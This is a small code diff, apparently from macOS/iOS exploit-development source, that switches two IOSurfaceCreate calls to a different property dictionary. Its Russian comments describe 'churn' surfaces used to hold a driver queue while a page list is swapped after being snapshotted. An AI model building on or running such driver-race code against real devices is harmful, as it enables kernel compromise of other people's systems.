@@ -6722,8 +6722,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // 1.9.142: churn на ОТДЕЛЬНЫХ поверхностях — churn-опы с srcID/dstID нашей
     // dstS ИСПОЛНЯЛИ её и снапшотили оригинальный page-list ДО подмены (раунд
     // 24: DVA-снапшот при первом EXECUTE). Churn держит очередь, не трогая dstS.
-    IOSurfaceRef churnSrc = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
-    IOSurfaceRef churnDst = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
+    IOSurfaceRef churnSrc = IOSurfaceCreate((__bridge CFDictionaryRef)sp32);
+    IOSurfaceRef churnDst = IOSurfaceCreate((__bridge CFDictionaryRef)sp32);
     uint32_t churnSrcID = churnSrc ? IOSurfaceGetID(churnSrc) : srcID;
     uint32_t churnDstID = churnDst ? IOSurfaceGetID(churnDst) : dstID;
     uint8_t tsdZ[KP_M2_TSD_SIZE];
